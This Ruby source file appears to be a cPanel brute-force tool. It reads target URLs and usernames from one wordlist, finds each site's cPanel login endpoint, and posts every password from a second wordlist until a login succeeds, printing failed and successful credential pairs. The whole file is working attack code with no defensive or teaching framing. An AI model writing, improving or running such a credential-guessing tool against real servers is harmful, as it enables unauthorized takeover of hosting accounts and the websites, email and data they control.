module Cpanel

	$redirect_regex = /\'redirect_url\'\:\s\"https\:\\\/\\\/([a-zA-Z0-9\.\:\-\_]+)/

	class Bruteforce

		def initialize()
			if system("gedit " + 'wordlists/domain_target.txt') == true
				wl 			= File.readlines('wordlists/domain_target.txt')
				wl_count 	= 0..wl.size.to_i - 1
				wl_count.each_with_index do |x|
					xs = wl[x].split("|")
					url = xs[0].gsub("\n","")
					user = xs[1].gsub("\n","")
					puts "==================================================================".white
					puts "- #{url}" + " processing...".yellow
					begin
						_main_(url,user)
					rescue Exception => e
						puts "- " + e.message.yellow
					end
				end
			end
		end # End Methode initialize

		def _main_(target,username)
			# url = target.gsub(/^https?\:\/\/(www.)?/,'')
			url = check_url(target)
			if url != nil
				wl = File.readlines('wordlists/cp_user.txt')
				count = wl.size.to_i
				for i in 0..count - 1
					password 	= 	wl[i].gsub(/\n/,'')
					response 	= 	post_login(url,username,password)
					parser 	 	= 	JSON.parse(response.body)
					if parser['status'] == 0
						puts "- [Failed]".yellow + " #{username}:#{password}"
					else
						puts "- [Success]".green + " #{username}:#{password}"
						exit
					end
				end
			end
		end

		def post_login(target,user,pass)

			if /https/.match(target) != nil
				xurl = "#{target}/login/?login_only=1"
			else
				xurl = "https://#{target}/login/?login_only=1"
			end

			return 	Net::HTTP::post_form(URI(xurl),
					"goto_uri" => "/","pass"=> "#{pass}","user"=> "#{user}")
		end

		def check_url(u)
			uri = URI(u + "/cpanel")
			http = Net::HTTP.new(uri.host, uri.port)
			http.open_timeout = 1
			if uri.scheme == "https"
				http.use_ssl 	= true
			end
			response = http.get(uri.request_uri)

			if response['location'] != nil
				return response['location']
			else
				redirect_url = response.body.scan($redirect_regex)
				return "#{redirect_url[0][0]}"
			end

		end

	end # End Class
end # End Module